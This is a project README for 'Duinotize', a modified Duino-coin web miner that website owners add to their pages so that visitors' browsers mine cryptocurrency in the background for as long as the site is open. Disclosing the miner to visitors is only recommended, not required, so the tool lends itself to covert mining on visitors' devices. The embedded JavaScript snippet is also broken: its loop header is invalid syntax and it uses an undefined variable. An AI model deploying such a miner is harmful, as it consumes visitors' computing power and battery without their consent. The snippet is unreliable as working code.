# Duinotize
_Duino-coin webminer/website monetizer_

Tired of showing users ads? Use Duinotize! It's a modified version of the Duino-coin web miner designed to be integrated into any website 

## Installation
Download [miner.js](https://github.com/mobilegmYT/Duinotize/raw/main/miner.js) + [hashes.js](https://github.com/mobilegmYT/Duinotize/raw/main/hashes.js), and put them in a new folder named `worker` in your website's root folder. For a example of how this is setup, look at https://github.com/Amog-OS/website, and you can also visit https://www.amogos.studio/donate and open the dev console to see the code in action.

Put the following code at the very bottom of the page most visiors will go to on your site, and once the page is opened the miner will be activated and run until your website (yes not just the page, but your whole website) is closed:
```
<script>
for (let threads = 1; let workersAmount = 0; workersAmount < threads; workersAmount++) {
    let socketWorker = new Worker("worker/miner.js");
    socketWorker.postMessage('Start,' + "[username]" + "," + "[rigid]" + "," + workerVer + "," + Math.floor(Math.random() * 2811) + "," + "[difficulty]");
    workerVer++;
}
</script>
```
NOTE: You'll want to replace `[username]` with your Duco account username, `[rigid]` with the ID you want it to show up as in the wallet, and `[difficulty]` with a mining difficulty of either "LOW", "MEDIUM", or "EXTREME" (do not use EXTREME or MEDIUM since they cause frequent socket disconnects). This is a example of what the postMessage line should look like:
`socketWorker.postMessage('Start,' + "rpinews" + "," + "Website-monotizer" + "," + workerVer + "," + Math.floor(Math.random() * 2811) + "," + "LOW");`.

We HIGHLY reccomend you put a note somewhere on your website to tell visiters that there is a crypto miner running in the background, and optionally credit this repo.

This project is a fork/continuation of https://github.com/VatsaDev/Mineuino as the original author seems to have abandoned it and the code is broken.

## Notes
- I made this in just 2 hours at 1AM, so if there are bugs PLEASE report them
- I also have never touched node.js before, so if there are improvements that could be made to the code, please PR them in.
- You can change the value of the `threads` variable, but note that this might make some devices unable to connect to your website!
